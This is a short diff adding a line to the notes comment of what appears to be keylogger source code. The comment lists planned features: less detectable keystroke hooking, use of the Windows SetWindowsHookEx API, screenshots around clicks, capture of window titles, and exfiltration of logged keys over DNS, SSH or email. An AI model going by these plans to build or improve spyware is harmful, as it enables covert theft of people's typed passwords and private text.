@@ -6,6 +6,7 @@
 /* NOTES:
 Currently dead simple. Areas for improvement:
  - Less detectable method of hooking user key presses (super high CPU usage with infinite loop right now)
+ - We really should be hooking Windows API (SetWindowsHookEx) here instead of making the calls we do
  - Grab screenshot of areas around cursor when clicking
  - Get Window title of where text was typed. Gives context into keys logged
  - Exfiltrate data over DNS, SSH, email, something like that
